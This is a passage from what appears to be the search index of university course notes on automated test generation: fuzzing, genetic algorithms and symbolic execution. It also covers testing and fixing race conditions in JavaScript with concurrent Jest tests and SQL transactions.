</ul>"},{"location":"notes/l11_1_auto_test_generation/#the-base-line-random-testing","title":"The Base Line - Random Testing","text":"<p>The base line of fuzzing is to randomly generate inputs as sequences of characters or bytes. Such a approach can be easily implemented. </p> <p>For instance, consider the javascript program <code>simple-fuzzer.js</code></p> <pre><code>function random_fuzz() {\n    let res = \"\";\n    // strings of any length between 0 and 1024\n    let length = Math.floor(Math.random() * 1024);\n\n    //generate a random character at each location of the string\n    for (let i =0 ; i &lt; length ; i ++) {\n        //generate a character between ASCII 32 and 128\n        let c = String.fromCharCode(Math.floor(Math.random() * 96) + 32);\n        res = res + c;\n    }\n    return res;\n}\n\nconsole.log(random_fuzz())\n</code></pre> <p>Running <code>node simple-fuzzer.js</code> produces</p> <pre><code>.u/m:SKx[-:\\3t3b?z87f)6'35!t1Y``fGR[_JS:&amp;9^RSIA6svw8G~!%!%_lHA9b\\-a\"cw$&lt;|$2Gc^8&amp;A*c$eT#wd&lt;QUd}Y1ua&gt;yDxh:=NC^3jI~KMivT'.j{Cp%cDco\\2aG/cw3d$&lt;Ih|vIm,_4d,oE8;nV!VXc:[1T,X{F)pIh8=+_[Xtm=_2X:9EWU_Oo*$|^0}nw~Dr1cQ(&lt;dr}Y7/lH&amp;mS$7?fx(F(]j)^9#j8.m2`&lt;v_]=\"PAI{qvD+yxPusDx!/5ZXMFf'b\"Q,.pt7K\\\\?i7Yj 8Tx)/E'`M[}=v{&gt;GtDbijU%mwEZB?PG]Fo{{6]jXRD[0(&lt;zgbsah1J!D&amp;m\\`aGQ8ehDbQN9&gt;^C&lt;I[AZ2;s'%_oj1}#RuCj~i=O\"vG]Q!FJ`UP:?{Y|]o\\P#7zi'8\\Ck@!vC./j:C.\\)iGx&gt;Q]@zffZ24]lZw4L7BKk0dA{/ Z6`3v:NN8:h:@/qOC.oq{O^kgYD(#;|@_\\i,l!x2P14G(|T+KL!bml:&lt;[P+Sh!*]JY|\\y\\dL[\n</code></pre> <p>In the older days when softwares were developed using less advanced tools and techniques, this approach was effective. In modern days, in which many softwares were developed with proper design and having standard input validation in-place, e.g. type checking, regex and parser etc. Most of the randomly generated input will be immediately rejected, without reaching very \"deep\" in the test subject. </p>"},{"location":"notes/l11_1_auto_test_generation/#mutation-based-fuzzing","title":"Mutation based fuzzing","text":"<p>One of the possible ways to overcome the limitation with the random testing is that we could consider generating fuzzy test cases based on known valid test inputs.</p> <p>For instance, assuming that we note that one of the valid inputs to the test subject is the following string</p> <pre><code>ISTDisApillarInSUTDbutItsNameiSGoingToChange\n</code></pre> <p>One possible way to mutate it is to choose a character at a random position and replace it by ssomething else.</p> <p>For instance, we randoml choose position (say 13) and replace the character <code>I</code> by character <code>Y</code></p> <pre><code>ISTDisApillarYnSUTDbutItsNameiSGoingToChange\n</code></pre> <p>The above is consdered an mutant of the original input. </p> <p>Here are some basic operations for mutation at some randomly chosen location.</p> <ul> <li>Flipping a bit/boolean/integer/character</li> <li>Trimming</li> <li>Swapping characters/bits</li> <li>Insert characters</li> </ul>"},{"location":"notes/l11_1_auto_test_generation/#corhort-exercise-graded","title":"Corhort Exercise (Graded)","text":"<p>Given an input string, implement a mutation operator that chooses a random position in the string and swaps the adjacent characters. Meaning if <code>SUTD</code> is an input string and 2 is chosen as the random position, the output should be <code>SUDT</code>. Careful about the string length bound check. </p>"},{"location":"notes/l11_1_auto_test_generation/#generation-based-fuzzing","title":"Generation based fuzzing","text":"<p>An alternative to Mutation-based fuzzing is touse generation based fuzzing.  In generation based fuzzing, we assume that we have access to a set of grammar rules that defines the possible syntatically valid inputs to the test subject. </p>"},{"location":"notes/l11_1_auto_test_generation/#formal-grammar","title":"Formal Grammar","text":"<p>In computer science, we often use formal grammar as the specification of a language. A language denotes a set of sequences of terminals. A terminal is often a symbol, a byte, or a number. </p> <p>For example, consider a language of arithmetic expressions which consists of  <code>+,-,*,/</code> as the operators and numbers as operands. In addition, we allow to use <code>()</code> to disambiguate ambiguous terms.</p> <p>For instance <code>5 + 2 * 3</code> is one of the valid expressions according to the following EBNF grammar rules</p> <pre><code>S ::= Expr\nExpr ::= Expr + Term | Expr - Term | Term\nTerm ::= Term * Factor | Term / Factor | Factor\nFactor ::= -Integer | (Expr) | Integer | Integer.Integer\nInteger ::= Digit | IntegerDigit\nDigit ::=  0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 \n</code></pre> <p>In the above, each line denotes a rule. A rule consists of a left-hand-side, a define operator <code>::=</code> and a right-hand-side. The LHS is a non-terminal. A non-terminal is a meta symbol in the grammar which defines a potential expension. As a dual, we have terminals, which are the atomic/elementary symbols in the languages, such as <code>0, 1, 2, 3, 4, 5, 6, 7, 8, 9, +, -, *, /, ,., (, )</code> and white space. The RHS of a rule is a set of alternatives sepearated by <code>|</code>. Each alternative is a sequence of terminals and non-terminals. </p> <p>We could interpret each rule as the LHS non-terminal can be potentially expanded into the one of the alternatives in the RHS. For example, we consider the rule with <code>Expr</code> as the LHS, which says the expression non-terminal can be either a + expression (which consists another <code>Expr</code>, a <code>+</code> and a non-terminal <code>Term</code>), or a - expression, or a <code>Term</code> by itself.</p>"},{"location":"notes/l11_1_auto_test_generation/#parse-tree","title":"Parse Tree","text":"<p>Given a grammar, a parser normally validates the input sequence by attempting to construct a parse tree. A parse tree records from which grammar rules the input sequence can be validated according to the grammar.  We can also think of the parse tree as the result of the parsing. </p> <p>For example, the exxpression <code>5 + 2 * 3</code> can be parsed into the following parse tree</p> <p><pre><code>graph\n   N0(\"S\") --&gt; N1\n   N1(\"Expr\") --&gt; N2\n   N1(\"Expr\") --&gt; N3(\"+\")\n   N1(\"Expr\") --&gt; N4\n   N2(\"Expr\") --&gt; N5\n   N5(\"Term\") --&gt; N6\n   N6(\"Factor\") --&gt; N7\n   N7(\"Integer\") --&gt; N8\n   N8(\"Digit\") --&gt; N9(\"5\")\n   N4(\"Term\") --&gt; N10\n   N4(\"Term\") --&gt; N11(\"*\")\n   N4(\"Term\") --&gt; N12\n   N10(\"Term\") --&gt; N13\n   N13(\"Factor\") --&gt; N14\n   N14(\"Integer\") --&gt; N15\n   N15(\"Digit\") --&gt; 2\n   N12(\"Factor\") --&gt; N16\n   N16(\"Integer\") --&gt; N17\n   N17(\"Digit\") --&gt; N18(\"3\")\n\n</code></pre> In the above parse tree, starting from the root, we find that the first rule we applied in parsing <code>5 + 2 * 3</code> is <code>S ::= Expr</code>. The subtree indicates that the second rule/alternative we apply is <code>Expr ::= Expr + Term</code>. The left subtree contains no branches, which leads us to the digit <code>5</code>. The right subtree indicates that the  rule we applied to parse the sub expression <code>2 * 3</code> is <code>Term ::= Factor</code>. </p>"},{"location":"notes/l11_1_auto_test_generation/#generate-fuzz-test-using-the-grammar","title":"Generate Fuzz test using the grammar","text":"<p>Given we understand the input requirement, we can now define a better fuzzer w.r.t to the grammar. The idea is to starting from the starting rule's nonterminal, randomly choose one grammar rule given the current non-terminal to generate a sub term (sub parse tree). We need to take note of</p> <ol> <li>Do not over expand with the recursive alternative.</li> <li>Do not always expand the same sub-tree / node. </li> </ol> <p>With this we can generate a good set of fuzz test input passing the syntax checking of the target software and yet having enough randomness.</p>"},{"location":"notes/l11_1_auto_test_generation/#cohort-exercise-graded","title":"Cohort Exercise (Graded)","text":"<p>Use JavaScript to implement a fuzzer that will randomly generate inputs to the calculator conforming to the grammar. For now, you can hardcode the expression grammar. </p> <p>Hint: Start with the initial rule <code>S ::= Expr</code> and at each point, apply a rule at random. For example, randomly choose any of the rules <code>Expr ::= Term</code>, <code>Expr ::= Expr + Term</code> or <code>Expr \u2013 Term</code> in the next step. Continue until a valid expression for the calculator is obtained. Make sure you do not expand the rules forever to avoid infinite loop. </p>"},{"location":"notes/l11_1_auto_test_generation/#limitations-of-fuzzing","title":"Limitations of Fuzzing","text":"<p>Fuzzing offers many perks to maintain goodd quality of softwares.</p> <ul> <li>Can provide results with little effort</li> <li>Can reveal bugs that were missed in a manual audit</li> <li>Provides an overall picture of the robustness of the target software</li> </ul> <p>It also shares certain limitations</p> <ul> <li>Will not find all bugs </li> <li>The crashing test cases that are produced may be difficult to analyse, as the act of fuzzing does not give you much knowledge of how the software operates internally</li> <li>Programs with complex inputs can require much more work to produce a smart enough fuzzer to get sufficient code coverage</li> </ul>"},{"location":"notes/l11_1_auto_test_generation/#feedback-based-fuzzing","title":"Feedback-based Fuzzing","text":"<p>Besides getting the fuzzer to leverage the input specification, another orthothongal approach is to gather feedback from the test report. </p> <p>The idea is to turn the test case generation problem into an optimization problem.</p> <p><pre><code>graph\n    N1--&gt;N2\n    N2(\"Execute Test Cases\")--&gt;N3\n    N3(\"Collect Feedback\")--&gt;N1(\"Generate Test Cases\")</code></pre> As illustrated by the above diagram, in a feedback-baed fuzzing testing framework, we first use a fuzzer to generate the test cases, Then execute the test cases against the test subject. Finally we collect the test outcomes and report as a feedback to the fuzzer which should improve the test effectivness.</p> <p>One common way to measure test effectiveness is to measure the code coverage. </p>"},{"location":"notes/l11_1_auto_test_generation/#exercise-not-graded","title":"Exercise (Not Graded)","text":"<p>Recall that in Jest, we can generate the coverage report in text or html. Note that it can also generate json report. With it, we can feed the json report back to the fuzzer to generate a better set of tests to increase the code coverage. </p> <p>Discuss among your team members to think of a possible implementation to incorporate feedback-based fuzzing</p>"},{"location":"notes/l11_1_auto_test_generation/#api-fuzzing","title":"API Fuzzing","text":"<p>Fuzz testing can be applied to API testing in several aspect</p> <ol> <li>Fuzzing the low level request - generates random bytes as HTTP requests to test the robustness of the API service.</li> <li>Fuzzing the routes - through fuzzers, we could generate sequences of random valid / invalid requests to the test the API routers.</li> <li>Fuzzing the high level request - generate GET/POST/DEL/PUT HTTP requests by fuzzing HTTP parameters or form parameters.</li> </ol> <p>Some references can be found in the following</p> <ul> <li><code>https://medium.com/@Magii/fuzzing-with-postman-599dce6317c7</code></li> <li><code>https://github.com/KissPeter/APIFuzzer</code></li> <li><code>https://docs.gitlab.com/ee/user/application_security/api_fuzzing/</code></li> </ul>"},{"location":"notes/l11_1_auto_test_generation/#fuzzing-test-on-ui","title":"Fuzzing test on UI","text":"<p>Fuzz testing can be applied to UI too.</p> <ol> <li>Fuzzing the UI element event handler by generating random input actions.</li> <li>Fuzzing the inputs to the HTML forms.</li> </ol> <p>Some reference can be found in the following</p> <ul> <li><code>https://www.fuzzingbook.org/html/GUIFuzzer.html</code></li> </ul>"},{"location":"notes/l11_2_auto_test_generation2/","title":"50.003 - Auto Test Generation Part 2","text":""},{"location":"notes/l11_2_auto_test_generation2/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to </p> <ol> <li>Apply Genetic algorithm for software testing.</li> <li>Apply Symbolic execution for software testing.</li> <li>Explain how to use symbolic execution for software verification.</li> </ol>"},{"location":"notes/l11_2_auto_test_generation2/#recap","title":"Recap","text":"<p>Recall from the last unit, we learned a special version fuzzing technique which leverages on the feedback given by the test reports.</p> <pre><code>graph\n    N1--&gt;N2\n    N2(\"Execute Test Cases\")--&gt;N3\n    N3(\"Collect Feedback\")--&gt;N1(\"Generate Test Cases\")</code></pre> <p>In each iteration, we take the feedback from the previous test execution to generate the next test cases, hoping the next test cases will perform better. The process of translating the feedback to a new version of test case might be quite tricky to implement as a rule-based system.</p>"},{"location":"notes/l11_2_auto_test_generation2/#genetic-algorithm","title":"Genetic algorithm","text":"<p>A possible way to automate the process of feedback-to-generate-better-test-cases is to adopt the genetic algorithm.</p> <p>Genetic Algorithms were invented to mimic some of the processes observed in natural evolution. The idea with GA is to use this power of evolution to solve optimization problems. The father of the original Genetic Algorithm was John Holland who invented it in the early 1970's.</p> <p>The main idea is to represent the set of all possible results, good or bad, intermediate or final as an entire population. Any subset of the entire population is considered as a generation. </p> <p></p> <p>The algorithm starts with randomly pick a subset as the first generation. The following steps are taken in each iteration</p> <ol> <li>compute the fitness score for each member in the current generation \\(G_i\\).</li> <li>pick a subset of \\(G_i\\), say \\(G_i'\\) such that all members in \\(G_i'\\) are fitter than the rest by a threshold. </li> <li>Use members in \\(G_i'\\) as \"parents\" to \"breed\" the next generation \\(G_{i+1}\\). </li> <li>set the current generation as \\(G_{i+1}\\).</li> </ol> <p>The above loop terminates when either  * the maximum number of iterations is reached or  * the overall fitness meets the minimum requirement or  * the fitness increment is smaller than threshold \\(fit(G_{i+1}) - fit(G_i) &lt; \\epsilon\\).</p>"},{"location":"notes/l11_2_auto_test_generation2/#using-ga-in-test-generation","title":"Using GA in test generation","text":"<p>for software testing, it is natural to apply GA. </p> <ol> <li>Let the set of all possible test inputs be the entire population. Each generatation is a proper subset of the entire population.</li> <li>Let the code coverage score be the fitness score for each test input.</li> <li>Viewing each test input as a sequence of bytes. There are at least two possible \"breeding\" operations.</li> <li>Cross-over. Taking two test inputs, say A and B from the \\(G_i'\\), and pick some random byte offsets that are common to both. Replace the bytes in A by those bytes from B based on the offsets. The result of this operation will be the member of the next generation.    </li> <li>Mutatation.  Take one test input say C from \\(G_i'\\), randomly pick a position and change the byte at the position which form a new input in the next generation.    </li> </ol>"},{"location":"notes/l11_2_auto_test_generation2/#limitation-of-ga-based-test-generation","title":"Limitation of GA based test generation","text":"<p>GA automates the search of best test cases for the given test subject. However it might take many iterations to reach the optimal set. Consider </p> <pre><code>function example(x,y) {\n    let a = [[1],[2],[3],[4],[5]]\n    if (y == 42342531) {\n        a[x][0] = y // x must be [0..4]\n    }\n}\n</code></pre> <p>In the above example, it will take a long time for the GA test case search to discover the bug is prensent when <code>x=5</code> and  <code>y=42342531</code>.</p> <p>To reach that branch fast, we need to exploit the code structure of <code>example()</code>, it is kind of white box fuzzing.</p>"},{"location":"notes/l11_2_auto_test_generation2/#symbolic-execution","title":"Symbolic execution","text":"<p>Symbolic exeuction is a kind of dynamic analysis that tries to reach to all executable paths in a function. It differs from concreate execution and testing for not giving concrete values to the function being invoked, instead, some symbolic arguments are given so as to collect the information. It differs from static analysis techniques as it retains a per path level of information for analysis, (which could also be a drawback, we will discuss it shortly).</p> <p>Given the function <code>example(x,y)</code>, invoking it with a concrete value say <code>example(100,42342531)</code> is known as a concrete execution. Symbolic execution on the other hand, does not invoke the funciton with concrete values, instead symoblic values are passed in. </p> <p>Supose <code>A</code> and <code>B</code> are two symbolic values, we can think of them as logical terms, not variable.</p> <pre><code>1: function example(A,B){\n2:    // A can be anything, B can be anything\n3:    let a = [[1],[2],[3],[4],[5]]\n4:    if (B == 42342531) {\n5:        // B must be 42342531\n6:        a[A][0] = B // 0 &lt;= A &lt; 5\n7:    } \n8: }\n</code></pre> <p>From the above, we find that for the path 3-&gt;4-&gt;6-&gt;7 to be covered, <code>B</code> must be <code>42342531</code>. By doing so, we can figure out the test case to cover that path.</p> <p>Besides generating test cases, Symbolic execution can detect bugs, dead codes and redunant assertion. </p> <p>For example, if we add an assertion statement at line 6,</p> <pre><code>1: function example(A,B){\n2:    // A can be anything, B can be anything\n3:    let a = [[1],[2],[3],[4],[5]]\n4:    if (B == 42342531) {\n5:        // B must be 42342531\n6:        assert(B&gt;0) // B &gt; 0\n7:        a[A][0] = B // 0 &lt;= A &lt; 5\n8:    } \n9: }\n</code></pre> <p>The symbolic execution framework generates the following set of constraints for the path 3-&gt;4-&gt;6-&gt;7-&gt;8, <pre><code>{ B == 42342531 &amp;&amp; \n  B &gt; 0 &amp;&amp; \n  0 &lt;= A &amp;&amp; \n  A &lt; 5 \n}\n</code></pre> since the first constraint implies the second one, the second constraint is redundant.</p> <p>Similarly if we have the following code</p> <pre><code>1: function example(A,B){\n2:    // A can be anything, B can be anything\n3:    let a = [[1],[2],[3],[4],[5]]\n4:    if (B == 42342531) {\n5:        // B must be 42342531\n6:        if (B&lt;0) { // B &lt; 0\n7:          a[A][0] = B // 0 &lt;= A &lt; 5\n8:        } \n9:    }\n10:}\n</code></pre> <p>The symbolic exuection framework generates the constraint set for the path 3-&gt;4-&gt;6-&gt;7-&gt;8-&gt;9-&gt;10, as </p> <pre><code>{\n    B == 42342531 &amp;&amp; \n    B&lt;0 &amp;&amp; \n    0 &lt;= A &amp;&amp; \n    A &lt; 5  \n}\n</code></pre> <p>which can not be satisfied hence this path of code is not reachable.</p> <p>Finally if we have the following code</p> <p><pre><code>1: function example(A,B){\n2:    // A can be anything, B can be anything\n3:    let a = [[1],[2],[3],[4],[5]]\n4:    if (B == 42342531) {\n5:        // B must be 42342531\n6:        A = B // A == B \n7:        a[A][0] = B //0 &lt;= A &lt; 5\n8:        \n9:    }\n10:}\n</code></pre> we have the following set of constraints</p> <pre><code>{ B == 42342531 &amp;&amp; B == A &amp;&amp; 0 &lt;= A &lt; 5 \n}\n</code></pre> <p>which is unsatifiable hence a bug must be present.</p> <p>As we observe, symbolic execution proceeds by  path following. For each path it traverse, it generates a set of constraints,</p> <ul> <li>if it is an assignment and the LHS is first time being assigned,  <code>x = e</code>, it generates an equality constraint <code>x == e</code>.</li> <li>if it is an re-assignment <code>x = e</code>, we need to create a fresh copy of <code>x</code>, say the last defined/assigned of <code>x</code> was  <code>x_i</code>, then add <code>x_{i+1} == e</code> to the constraint sets, and rename all the use of <code>x</code> to <code>x_{i+1}</code> in the statements that come after the current one.</li> <li>if it is an <code>if p { s1 } else { s2 }</code>, it generate two paths with the first path having <code>p</code> and the second path having <code>!(p)</code>.</li> <li>if it is a <code>while p { s }</code>, it generates a path into the loop body with <code>p</code> as part of the constraint set, and another path with <code>!p</code> as it exits the loops. </li> </ul> <p>We can also add extra constraints such as the reference of the array elements must be within range.</p> <p>For example,</p> <pre><code>1: function sum_upto(n) {\n2:    let s = 0;\n3:    let i = 0;\n4:    while (i &lt; n) {\n5:        s = s + i;\n6:        i = i + 1;\n7:    }\n8:    return s;\n9: }\n</code></pre> <p>we first \"get\" rid of the while loop by unrolling it once and one.</p> <p>Path 1: <pre><code>1: function sum_upto(N) {\n2:    let s = 0;\n3:    let i = 0;\n7:    assert(i &gt;= N) // !(i&lt;n)\n8:    return s;\n9: }\n</code></pre></p> <p>Path 2: <pre><code>1: function sum_upto(N) {\n2:    let s = 0;\n3:    let i = 0;\n4:    assert(i &lt; N) // (i&lt;n)\n5:    s = s + i;\n6:    i = i + 1;\n7:    assert(i &gt;=N) // !(i&lt;n)\n8:    return s;\n9: }\n</code></pre></p> <p>We then rename the variables used in the assignments into single assignment form.</p> <p>Path 1: <pre><code>1: function sum_upto(N) {\n2:    let s0 = 0;\n3:    let i0 = 0;\n7:    assert(i0 &gt;= N) // !(i&lt;n)\n8:    return s0;\n9: }\n</code></pre></p> <p>Path 2: <pre><code>1: function sum_upto(N) {\n2:    let s0 = 0;\n3:    let i0 = 0;\n4:    assert(i0 &lt; N) // (i&lt;n)\n5:    s1 = s0 + i;\n6:    i1 = i0 + 1;\n7:    assert(i1 &gt;=N) // !(i&lt;n)\n8:    return s1;\n9: }\n</code></pre></p> <p>Then we have two versions of the above.</p> <p>One version of not entering the while loop body. <pre><code>1: {\n2:    s0 == 0 &amp;&amp;\n3:    i0 == 0 &amp;&amp;\n4:    !(i0 &lt; N)  \n9: }\n</code></pre> And another version of executing the while loop body once.</p> <p><pre><code>1: {\n2:    s0 == 0 &amp;&amp;\n3:    i0 == 0 &amp;&amp;\n4:    i0 &lt; N &amp;&amp; \n5:    s1 == s0 + i0 &amp;&amp;\n6:    i1 == i0 + 1 &amp;&amp;\n7:    !(i1 &lt; N)\n9: }\n</code></pre> We could have more versions of having while loop being unrolled more than once, we just need to be adding extra superscripts to distinguish variables being re-assigned in different iterations.</p> <p>We finally can send these versions to constraint solvers to check for satisfiability.</p>"},{"location":"notes/l11_2_auto_test_generation2/#limitation-of-symbolic-execution","title":"Limitation of Symbolic execution","text":"<p>Symbolic execution was a nice framework with strong formalism behind and highly useful. There are several issues required more care. </p>"},{"location":"notes/l11_2_auto_test_generation2/#limitation-of-the-solvers","title":"Limitation of the solvers","text":"<p>It relias on the solver's capabilities. Hence in case of complex inequality, we might not get an answer.</p> <pre><code>function f(x, y, z) {\n    if (x*x*x*x + y*y*y &lt; z*z) {\n        assert(false);\n    }\n}\n</code></pre> <p>Existing SMT solvers support theories on linear integer arithmetic, bit vectors, string, etc. Existing SMT solvers are not particularly scalable or efficient for certain theories e.g., non-linear arithmetic.</p> <ul> <li>In such cases symbolic execution will not (always) be able to evaluate which side of the branch should be taken. </li> <li>Thus, symbolic execution may randomly generate some inputs to find one of the feasible execution, losing opportunities to cover a large portion of code. </li> </ul>"},{"location":"notes/l11_2_auto_test_generation2/#memory-object-aliasing","title":"Memory object aliasing","text":"<p>Keeping track of constraints among variables with primitive values are straight-forward, it is not that simple when dealing with reference to objects in the heap.</p> <p>For instance consider </p> <pre><code>1: class A {\n2:    constructor(x) { this.attr = x};\n3: }\n4: function foo(N) {\n5:    let a = new A(N); // a == mloc1 &amp;&amp; mloc1.attr == N\n6:    if (a.attr == N) {\n7:        let b = a; // b == a\n8:        b.attr = N+1; // mloc1.attr == N +1 \n9:    }\n10:}\n</code></pre> <p>If we naively construct a set of constraint from a path from 5\u21926\u21927\u21928\u21929, we have the following</p> <p><pre><code>{\n  a == mloc1 &amp;&amp; \n  mloc1.attr == N &amp;&amp;\n  mloc1.attr == N &amp;&amp;\n  b == a &amp;&amp;\n  mloc1.attr == N+1\n}\n</code></pre> which is not satisfiable, but the above path of executions should be valid. Clearly we need a better model to manage to heap objects.</p>"},{"location":"notes/l11_2_auto_test_generation2/#treatment-of-loops","title":"Treatment of loops","text":"<p>Symbolic Execution does not cover all the paths, e.g. we have to fix a limit to how many time the loop can be unrolled, or require the programmers to annotate the loop with invariant (which is uncommon for day-to-day programming). For example, if a program add an invariant constraint of the while loop <code>s &lt;= i * (i-1) / 2</code>, we could verify that for all  versions of <code>s_k</code> and <code>i_k</code>, satifies the invariant contraints, for example</p> <p><pre><code>s0 == 0 &amp;&amp; i0 == 0  &amp;&amp; i0 == N  ==&gt; s0 &lt;=  i0 * (i_{-1} - 1) / 2\n</code></pre> <code>i_{-1}</code> is undefined but since <code>i0</code> is 0, hence the above holds</p> <pre><code>s1 == s0 + i0 &amp;&amp; i1 == i0 + 1 &amp;&amp; i0 == 0 &amp;&amp; i0 == N  ==&gt; s1 &lt;=  i1 * (i0 - 1) / 2\n</code></pre> <p>This generalizes to for all <code>k</code>.  Thus, when <code>N &gt;=0</code>,  We can then use the invariant plus the post condition <code>i==N</code> as the approximiated constraint set for the loop for the subsequent paths, this is to like combining static analysis with dynamic analysis.</p>"},{"location":"notes/l12_1_concurrent_testing/","title":"50.003 - Concurrency and Concurrent Testing","text":""},{"location":"notes/l12_1_concurrent_testing/#learning-outcomes","title":"Learning Outcomes","text":"<ol> <li>Eliminate race condition in web application via transaction</li> <li>Perform concurrent testing</li> </ol>"},{"location":"notes/l12_1_concurrent_testing/#concurrency","title":"Concurrency","text":"<p>Concurrency is ubiquitous in modern software systems, web application, mobile applications, chat bots, etcs are required to support multiple and concurrent users acess.  As we learned from other modules, such 50.001 and 50.005, software concurrency imposes many challenges, e.g. race conditions, deadlock, starvation and etc. </p> <p>Codes that exhibits correct behavior when being executed sequentially are not necessarily correct when being executed concurrently or interleaved by instructions. This implies that we need a different testing strategy when hunting for bugs in concurrent software system.</p>"},{"location":"notes/l12_1_concurrent_testing/#race-condition-in-javascript","title":"Race condition in JavaScript","text":"<p>Racing condition examples found in the literatures involve the usage of threads and shared resources.  Since JavaScript does not offer multi-threading operation, one may optimistically think that programs written in JavaScript will not suffer from the curse of race condition and its related consequences. Unfortunately, such a optimism is 100% wrong in reality. </p> <p><pre><code>let a = { bal : 100 }\nlet b = { bal : 200 }\nlet c = { bal : 150 }\n\nfunction get_bal(acc) {\n    return new Promise((resolve, reject) =&gt; {\n        resolve(acc.bal);\n    })\n}\n\nfunction set_bal(acc, new_bal) {\n    return new Promise((resolve, reject) =&gt; {\n        acc.bal = new_bal;\n        resolve(new_bal);\n    })\n}\n</code></pre> In the above we instantiate three objects to simulate some separates accounts. We define </p> <ul> <li>a <code>get_bal()</code> promise builder function which returns a promise that resolves on the account's balance.</li> <li>a <code>set_bal()</code> promise builder function which returns a promise that updates the account's balance.</li> </ul> <p>Next we define a <code>transfer()</code> function which transfer some amount from two accounts, by calling <code>get_bal()</code> and <code>set_bal()</code> <pre><code>async function transfer(src, dst, amt) {\n    let src_bal = await get_bal(src);\n    let dst_bal = await get_bal(dst);\n    if (src_bal &gt; amt) {\n        await set_bal(dst, dst_bal + amt); \n        await set_bal(src, src_bal - amt);\n    }\n}\n</code></pre></p> <p>Finally, we define our main function and the aftermath observation  <pre><code>async function main() {\n    await transfer(b, a, 100);\n    await transfer(c, a, 50);\n}\n\nmain().then(\n    async function () {\n        let bal_b = await get_bal(b);\n        let bal_a = await get_bal(a);\n        let bal_c = await get_bal(c);\n        console.log(bal_a,bal_b,bal_c);\n    }\n)\n</code></pre> In the <code>main()</code> function, we sequentially transfer 100 from <code>b</code> to <code>a</code> then transfer 50 from <code>c</code> to <code>a</code>. </p> <p>We observe the closing balances as <code>250 100 100</code>.</p> <p>This is fine because the two transfer operations were carried out in sequence, (enforced by two <code>await</code>).</p> <p>Suppose we change the <code>main</code> function as follows, </p> <pre><code>async function main() {\n    transfer(b, a, 100);\n    await transfer(c, a, 50);\n}\n</code></pre> <p>or </p> <p><pre><code>async function main() {\n    await Promise.all([\n        transfer(b, a, 100),\n        transfer(c, a, 50)\n    ]);\n}\n</code></pre> In either way, the two transfer operations are performed concurrently, i.e. the promises are now interleaved. When we observe the closing balances as <code>150 100 100</code>. A racing condition is triggered.</p> <p>One may argue that the above variants of <code>main()</code> are unusual, after some code review, we perhaps can eliminate the bugs. However, in the event that the two transfer operations are triggered from separate server events, e.g. from two different HTTP request handlers, such a racing condition is inevitable.</p>"},{"location":"notes/l12_1_concurrent_testing/#concurrent-testing","title":"Concurrent Testing","text":"<p>Now we are convinced that the racing condition is ubiqitious, the next question is to how to test our codes such that we can unearth the potential critical sections with racing condition. </p> <p>For instance, in the echo app model file <code>message.js</code> we would like to define a new operation which first search for a message by the timestamp in the database, update it if the message exists. </p> <pre><code>async function update(time, appendMsg) {\n    try {\n        const [rows, fieldDefs] = await db.pool.query(`\n            SELECT * FROM ${tableName} where time = ?`, [time]\n        );\n        if (rows.length &gt; 0) {\n            var message = new Message(rows[0].msg, rows[0].time)\n            await db.pool.query(`\n                UPDATE ${tableName} SET msg = ? WHERE time = ?`, [message.msg + appendMsg, message.time]\n            );\n        }\n    } catch (error) {\n        console.error(\"database connection failed. \" + error);\n        throw(error);\n    } \n}\n</code></pre> <p>In the event of concurrent access, such a find-and-update operation can lead to a racing condition. </p> <p>In other languages like Java, we can create test case with multiple threads running the concurrent section multiple of times and validate the final result is a semantically correct one.  In JavaScript, we can construct such a concurrent test case using <code>Promise.all()</code>, </p> <p><pre><code>async function setup() {\n    try {\n        // TODO backup the existing data to a temp table?\n        await db.pool.query(`\n            DELETE FROM message;`\n        );\n        await db.pool.query(`\n            INSERT INTO message (msg, time) \n            VALUES ('msg a', '2009-01-01:00:00:00')\n        `);\n    } catch (error) {\n        console.error(\"setup failed. \" + error);\n        throw error;\n    }\n}\n\ntest (\"testing message.update() concurrently \", async () =&gt; {\n    const expected = [ \n        new message.Message('msg aaa', new Date('2009-01-01:00:00:00'))]\n    const concurrent_task = () =&gt; message.update('2009-01-01:00:00:00', 'a');\n    await Promise.all([ // running 2 update concurrently. \n        retry.retry(concurrent_task,2,1000), // (re-)try max twice with 1s delay\n        retry.retry(concurrent_task,2,1000)\n    ]);\n    let result = await message.all();\n    expect(result.sort()).toEqual(expected.sort());\n});\n</code></pre> In the above test case, we start off our data base with two messages.  In the test case, we define a task which update the message with <code>'2009-01-01:00:00:00'</code> by appending an <code>a</code>. After running instances of the task concurrently, we should have the message <code>msg aaa</code>. </p> <p>However, running the above test multiple of times, we find it fails sometimes, with the following error. </p> <pre><code> FAIL  __test__/models/message.test.js\n  \u25cf models.message tests \u203a testing message.update() concurrently \n    expect(received).toEqual(expected) // deep equality\n\n    - Expected  - 1\n    + Received  + 1\n    @@ -1,8 +1,8 @@\n      Array [\n        Message {\n    -     \"msg\": \"msg aaa\",\n    +     \"msg\": \"msg aa\",\n          \"time\": 2008-12-31T16:00:00.000Z,\n        }]\n</code></pre>"},{"location":"notes/l12_1_concurrent_testing/#to-fix-the-racing-condition-on-the-database-level","title":"To fix the racing condition on the database level.","text":"<p>We can address such a data racing condition at the database level. In many modern database systems, we find database transaction typically useful in managing concurrent read and update combo operations. </p> <p><pre><code>START TRANSACTION;\nSELECT ...\nUPDATE ...\nCOMMIT;\n</code></pre> In a nutshell, SQL statements enclosed by <code>BEGIN TRANSACTION; ... COMMIT;</code> are to be executed by the datbase systems atomically and in isolation. Informally speaking, the enclosed statements should not be interleaved with other statements that cause a racing condition. In the event a racing condition is detected, a database exception is raised and  the query statements are rejected. A retry or an abort is required. </p> <p>Let's rewrite the above unsafe update as follows, </p> <p><pre><code>async function update(time, appendMsg) {\n    let connection = null; \n    try {\n        connection = await db.pool.getConnection();\n        await connection.query(\n             \"SET SESSION TRANSACTION ISOLATION LEVEL SERIALIZABLE\" \n        ); \n        await connection.query(\"START TRANSACTION\");    \n        const [rows, fieldDefs] = await connection.query(`\n            SELECT * FROM ${tableName} where time = ?`, [time]\n        );\n        if (rows.length &gt; 0) {\n            var message = new Message(rows[0].msg, rows[0].time)\n            await connection.query(`\n                UPDATE ${tableName} SET msg = ? WHERE time = ?`, [message.msg + appendMsg, message.time]\n            );\n        }\n        await connection.query(\"COMMIT\");\n    } catch (error) {\n        if (connection) {\n            await connection.query(\"ROLLBACK\");\n            await connection.release();\n        }\n        console.error(\"database connection failed. \" + error);\n        throw(error);\n    } finally {\n        if (connection) {\n            await connection.release();\n        }    \n    }\n}\n</code></pre> In the above version, 